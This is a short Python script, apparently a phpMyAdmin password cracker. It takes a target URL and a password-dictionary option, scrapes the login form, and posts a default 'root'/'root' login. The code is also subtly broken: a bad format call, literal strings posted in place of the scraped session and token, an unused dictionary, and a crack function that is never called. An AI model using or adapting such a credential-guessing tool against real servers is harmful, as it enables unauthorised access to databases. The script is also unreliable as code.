import optparse
import re
from bs4 import BeautifulSoup
import requests

def option():
    usage = '%prog -h | --help'

    parser = optparse.OptionParser(usage = usage)
    parser.add_option("-u",dest="url",help="target url  usage: -u http://www.xxx.com/phpmyadmin")
    parser.add_option("-d",dest="dict",help="dict path   usage: -d /xxx/xxx/password.txt")
    (options, args) = parser.parse_args()

    url_pattern = re.compile(r'^https?:/{2}\w.+$')
    url = url_pattern.match(options.url)

    if url:
        print (options.url)
    else:
        parser.print_help()
        print("Please check your input format")

def Crack():
    rs = requests.session()
    url = "{target_url}".format(url=url)

    r = rs.get(url)
    headers = {'Content-Type':'application/x-www-form-urlencoded',
            'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            }
    soup=BeautifulSoup(r.text,'html.parser')
    rev = soup.find_all("form")[1]
    rev_session = rev.find_all("input")[0].attrs['value']
    rev_token = rev.find_all("input")[-1].attrs['value']
    payload = {
        'set_session':'rev_session',
        'pma_username':'root',
        'pma_password':'root',
        'server':'1',
        'token':'rev_token'
    }

    res = rs.post(url, data=payload, headers=headers)
    print(res.text)
    
def main():
    option()

if __name__ == '__main__':
    main()